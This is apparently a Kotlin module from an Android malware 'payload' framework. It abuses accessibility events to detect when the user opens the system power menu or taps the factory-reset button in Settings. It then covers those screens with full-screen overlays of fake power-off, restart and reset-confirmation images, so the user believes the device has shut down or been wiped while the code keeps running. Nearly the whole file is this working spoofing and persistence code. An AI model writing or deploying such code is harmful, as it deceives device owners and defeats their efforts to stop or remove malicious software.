package com.speedster.payload

import android.content.Context
import android.graphics.BitmapFactory
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import androidx.compose.animation.*
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Text
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Button
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.nativeCanvas
import kotlin.math.roundToInt
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {

    override @Composable fun Render(context: Context, resDir: File) {
        val clipboardManager = LocalClipboardManager.current
        
        val fakeMenuBitmap = remember(resDir) {
            try {
                BitmapFactory.decodeFile(File(resDir, "fake_menu.png").absolutePath).asImageBitmap()
            } catch (e: Exception) { null }
        }

        LaunchedEffect(Unit) {
            DynamicEntry.log("📡 Ghost active. Monitoring SystemUI hooks...")
            var isInjectionScheduled = false
            
            DynamicEntry.accessibilityInterceptor = { event ->
                val pkg = event.packageName?.toString() ?: ""
                val eventType = event.eventType
                
                // --- HEAVY VERBOSE LOGGING ---
                if (pkg.contains("settings")) {
                    if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                        DynamicEntry.log("🔎 SETTINGS WINDOW: ${event.className}")
                        // Dump tree to see if ID changed under our feet
                        DynamicEntry.activeAccessibilityService?.rootInActiveWindow?.let { dumpNode(it, 0) }
                    }
                    
                    if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                        val source = event.source
                        val sId = source?.viewIdResourceName ?: "UNKNOWN_ID"
                        val sTxt = source?.text?.toString() ?: "NO_TEXT"
                        DynamicEntry.log("🖱️ CLICK ATTEMPT: id=[$sId] txt=[$sTxt]")
                        
                        if (sId.contains("initiate_main_clear")) {
                            DynamicEntry.log("✅ MATCH FOUND! Launching overlay...")
                            DynamicEntry.overlayContent = {
                                val resetBitmap = remember(resDir) {
                                    try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
                                }
                                Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
                                    if (resetBitmap != null) {
                                        Image(
                                            bitmap = resetBitmap,
                                            contentDescription = null,
                                            modifier = Modifier.fillMaxSize(),
                                            contentScale = ContentScale.FillBounds
                                        )
                                    }
                                }
                            }
                        } else {
                            DynamicEntry.log("❌ NO MATCH: [$sId] != [initiate_main_clear]")
                        }
                    }
                }
                // ------------------------------

                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                val hasPowerMenu = root?.let { checkNodes(it) } ?: false
                
                if (hasPowerMenu) {
                    if (DynamicEntry.overlayContent == null && !isInjectionScheduled) {
                        isInjectionScheduled = true
                        DynamicEntry.log("🎯 TARGET DETECTED: Scheduling Injection")
                        
                        // Strategic Delay: Let the system window settle first
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            isInjectionScheduled = false
                            DynamicEntry.overlayContent = {
                                var currentScreen by remember { mutableStateOf(0) }
                                
                                val powerBitmap = remember(resDir) {
                                    try { BitmapFactory.decodeFile(File(resDir, "power.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
                                }
                                val restartBitmap = remember(resDir) {
                                    try { BitmapFactory.decodeFile(File(resDir, "restart.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
                                }

                                Crossfade(
                                    targetState = currentScreen, 
                                    animationSpec = tween(durationMillis = 300), 
                                    label = "MenuTransition"
                                ) { screen ->
                                    Box(
                                        modifier = Modifier
                                            .fillMaxSize()
                                            .background(Color.Black)
                                            .pointerInput(Unit) {
                                                detectTapGestures { offset ->
                                                    if (screen == 0) {
                                                        // Power Off (Tap 1) -> 290, 747
                                                        val dxP = offset.x - 290f
                                                        val dyP = offset.y - 747f
                                                        if (dxP * dxP + dyP * dyP < 200f * 200f) {
                                                            DynamicEntry.log("🔘 Power Off Tapped. Crossfading...")
                                                            currentScreen = 1
                                                        }
                                                        
                                                        // Restart (Tap 2) -> 774, 803
                                                        val dxR = offset.x - 774f
                                                        val dyR = offset.y - 803f
                                                        if (dxR * dxR + dyR * dyR < 200f * 200f) {
                                                            DynamicEntry.log("🔄 Restart Tapped. Crossfading...")
                                                            currentScreen = 2
                                                        }
                                                    }
                                                }
                                            }
                                    ) {
                                        val activeBitmap = when(screen) {
                                            1 -> powerBitmap
                                            2 -> restartBitmap
                                            else -> fakeMenuBitmap
                                        }
                                        
                                        if (activeBitmap != null) {
                                            Image(
                                                bitmap = activeBitmap,
                                                contentDescription = null,
                                                modifier = Modifier.fillMaxSize(),
                                                contentScale = ContentScale.FillBounds
                                            )
                                        }
                                    }
                                }
                            }
                            DynamicEntry.log("💉 INJECTED: Overlay should be on top.")
                        }, 150)
                    }
                } else {
                    if (DynamicEntry.overlayContent != null || isInjectionScheduled) {
                        DynamicEntry.overlayContent = null
                        isInjectionScheduled = false
                        DynamicEntry.log("📉 TARGET LOST: Cleaning stack.")
                    }
                }
            }
        }

        // --- THE APP CONSOLE ---
        Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
            Text("GHOST CONSOLE", color = Color.Green, fontSize = 18.sp)
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                Button(onClick = { DynamicEntry.systemLogs.clear() }) { Text("Clear") }
                Button(onClick = { 
                    val allLogs = DynamicEntry.systemLogs.joinToString("\n")
                    clipboardManager.setText(AnnotatedString(allLogs))
                }) { Text("Copy") }
            }
            LazyColumn(modifier = Modifier.weight(1f).fillMaxWidth()) {
                items(DynamicEntry.systemLogs.asReversed()) { log ->
                    Text(log, color = Color(0xFF00FF00), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                    HorizontalDivider(color = Color.DarkGray)
                }
            }
        }
    }

        private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
        val idMatch = node.viewIdResourceName?.contains("sec_global_actions") == true
        val classMatch = node.className?.contains("GlobalActions") == true
        if (idMatch || classMatch) return true
        for (i in 0 until node.childCount) {
            if (checkNodes(node.getChild(i) ?: continue)) return true
        }
        return false
    }

    private fun dumpNode(node: AccessibilityNodeInfo?, depth: Int) {
        if (node == null) return
        val id = node.viewIdResourceName ?: ""
        val text = node.text?.toString() ?: ""
        if (id.isNotEmpty() || text.isNotEmpty()) {
            DynamicEntry.log("${" ".repeat(depth)}|-- [$id] txt:[$text]")
        }
        for (i in 0 until node.childCount) {
            dumpNode(node.getChild(i), depth + 1)
        }
    }
}
